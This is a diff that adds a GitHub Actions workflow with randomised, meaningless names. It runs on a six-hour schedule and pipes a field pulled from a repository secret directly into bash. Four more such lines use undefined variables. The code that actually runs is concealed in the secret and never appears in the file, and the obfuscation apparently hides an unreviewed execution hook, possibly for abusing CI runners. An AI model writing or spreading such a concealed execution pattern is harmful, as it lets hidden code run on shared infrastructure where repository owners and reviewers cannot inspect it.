@@ -1,0 +1,23 @@
+name: qiushiliumenn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiushiliumenn
+        env:
+          bgmr9: ${{ secrets.bgmr9 }}
+        run: |
+          echo $bgmr9 | jq -r .igbl49894 | /bin/bash
+          echo $n82 | jq -r .rxips6 | /bin/bash
+          echo $omyg7 | jq -r .zj7060 | /bin/bash
+          echo $kud91 | jq -r .lf7 | /bin/bash
+          echo $xk91410 | jq -r .om3 | /bin/bash
+
